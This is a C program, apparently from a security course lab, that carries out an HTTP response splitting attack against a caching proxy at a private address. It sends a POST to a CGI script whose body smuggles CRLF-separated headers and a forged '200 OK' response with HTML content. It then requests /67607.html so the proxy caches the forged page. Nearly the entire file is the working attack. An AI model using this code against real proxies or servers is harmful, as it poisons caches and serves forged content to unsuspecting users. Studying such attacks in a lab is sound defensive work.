#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PROXY_IP "192.168.1.202" // Proxy server IP
#define PROXY_PORT 8080          // Proxy server port
#define RESPONSE_BUFFER_SIZE 8192
#define DATE_HEADER_SIZE 128
#define ID "212973481"

#include <stdio.h>
#include <time.h>

// Function to generate the current date in HTTP header format
void generate_date_header(char *date_header, size_t size) {
    time_t now = time(NULL);
    struct tm *gmt = gmtime(&now);

    // Format: "Day, DD Mon YYYY HH:MM:SS GMT"
    strftime(date_header, size, "%a, %d %b %Y %H:%M:%S GMT", gmt);
}


void send_http_response_splitting_attack() {
    int sockfd;
    struct sockaddr_in proxy_addr;
    char attack_request[1024];
    char proxy_response[1024];

    char date_header[DATE_HEADER_SIZE];

    // Generate the Date header
    generate_date_header(date_header, DATE_HEADER_SIZE);



     snprintf(attack_request, sizeof(attack_request),
         "POST /cgi-bin/course_selector HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
         "Content-Length: %u\r\n"
         "Connection: keep-alive\r\n\r\n"

         "course_id=67607\r\n"
         "Content-Length: 0\r\n"
         "Connection: keep-alive\r\n\r\n"

         
         "HTTP/1.1 200 OK\r\n"
         "Date: %s\r\n"  // Added Date header
         "Last-Modified: Thu, 02 Jan 2025 19:07:00 GMT\r\n"
         "Content-Type: text/html\r\n"
         "Content-Length: 22\r\n"
         "Connection: close\r\n\r\n"

         "<HTML>%s</HTML>"
         "HTTP/1.1 200 OK\r\n"

         ,267, date_header,ID);


    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        //perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure the proxy address
    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(PROXY_PORT);
    if (inet_pton(AF_INET, PROXY_IP, &proxy_addr.sin_addr) <= 0) {
        //perror("Invalid proxy IP address");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Connect to the proxy server
    if (connect(sockfd, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
        //perror("Connection to proxy server failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Send the crafted HTTP request
    if (send(sockfd, attack_request, strlen(attack_request), 0) < 0) {
        //perror("Failed to send attack_request");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    

    
    // Receive the response from the proxy server
    ssize_t bytes_received = recv(sockfd, proxy_response, sizeof(proxy_response) - 1, 0);
    if (bytes_received < 0) {
        //perror("Failed to receive response from proxy");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    



    char injected2_response[RESPONSE_BUFFER_SIZE];

    snprintf(injected2_response, sizeof(injected2_response),
             // First response
            "GET /67607.html HTTP/1.1\r\n"
            "Host: 192.168.1.202\r\n"
            "Connection: close\r\n\r\n"
    );

         
      if (send(sockfd, injected2_response, strlen(injected2_response), 0) < 0) {
        //perror("Failed to send combined_response");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    bytes_received = recv(sockfd, injected2_response, sizeof(injected2_response) - 1, 0);
    if (bytes_received < 0) {
        //perror("Failed to receive response from proxy");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Close the socket
    close(sockfd);
}

int main() {
    send_http_response_splitting_attack();
    return 0;
}



